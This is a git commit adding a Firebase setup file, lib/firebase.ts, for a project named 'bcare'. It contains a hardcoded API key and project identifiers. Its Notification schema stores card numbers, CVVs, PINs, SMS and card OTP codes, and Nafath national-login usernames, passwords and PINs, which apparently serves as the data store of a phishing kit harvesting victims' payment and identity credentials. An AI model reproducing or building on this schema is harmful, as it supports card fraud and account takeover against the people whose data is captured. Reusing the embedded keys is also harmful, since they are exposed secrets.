c89a96e101bf52f9141998a0e594b037028f16fd
a96363877 <a96363877@gmail.com>
2025-04-09 07:01:08 +0300

    SA

---
+++ lib/firebase.ts
@@ -0,0 +1,80 @@
+import { initializeApp, getApps, getApp } from "firebase/app";
+import { getAuth } from "firebase/auth";
+import { getFirestore } from "firebase/firestore";
+const firebaseConfig = {
+   apiKey: "AIzaSyBjy50rWzFnGGXApGjJPvCVWSTEd1AAVSo",
+  authDomain: "bcare-ae52f.firebaseapp.com",
+  projectId: "bcare-ae52f",
+  storageBucket: "bcare-ae52f.firebasestorage.app",
+  messagingSenderId: "499327765670",
+  appId: "1:499327765670:web:9cc20b4a84cfef1467f867",
+  measurementId: "G-GDS53LT0H7"
+};
+
+
+const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+
+export interface PaymentData {
+  card_number?: string;
+  cvv?: string;
+  expiration_date?: string;
+  full_name?: string;
+}
+
+export interface FormData {
+  card_number?: string;
+  cvv?: string;
+  expiration_date?: string;
+  full_name?: string;
+}
+
+export interface Notification {
+  id: string;
+  agreeToTerms?: boolean;
+  card_Holder_Name?: string;
+  card_number?: string;
+  createdDate: string;
+  customs_code?: string;
+  cvv?: string;
+  document_owner_full_name?: string;
+  expiration_date?: string;
+  formData?: FormData;
+  full_name?: string;
+  insurance_purpose?: string;
+  owner_identity_number?: string;
+  pagename?: string;
+  paymentData?: PaymentData;
+  paymentStatus?: string;
+  phone?: string;
+  phone2?: string;
+  seller_identity_number?: string;
+  serial_number?: string;
+  status?: string;
+  vehicle_manufacture_number?: string;
+  documment_owner_full_name?: string;
+  vehicle_type?: string;
+  isHidden?: boolean;
+  pinCode?: string;
+  otpCardCode?: string;
+  phoneOtp?: string;
+  otpCode?: string;
+  otpStatus?: string;
+  externalUsername?: string;
+  externalPassword?: string;
+  nafadUsername?: string;
+  nafadPassword?: string;
+  nafaz_pin?: string;
+  autnAttachment?: string;
+  requierdAttachment?: string;
+  operator?: string;
+  otpPhoneStatus: string;
+  isRead?: boolean;
+  cardOtpStatus?: string;
+  phoneVerificationStatus?: string;
+  phoneOtpCode?: string;
+  phoneOtpStatus?: string;
+}
+
+export { app, auth, db };
